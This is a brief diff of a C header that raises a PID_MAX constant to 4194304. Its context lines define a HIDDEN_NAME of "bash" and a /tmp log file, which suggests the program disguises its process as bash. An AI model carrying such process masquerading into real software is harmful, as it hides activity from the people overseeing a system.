@@ -5,7 +5,7 @@ struct state_s;
 typedef struct state_s state_t;
 
 #define DEBUG 1
-#define PID_MAX 32768 
+#define PID_MAX 4194304 /* TODO read in /proc/sys/kernel/pid_max */
 #define TMPDIR "/tmp/"
 #define HIDDEN_NAME "bash"
 #define LOG_FILE "/tmp/log.txt"
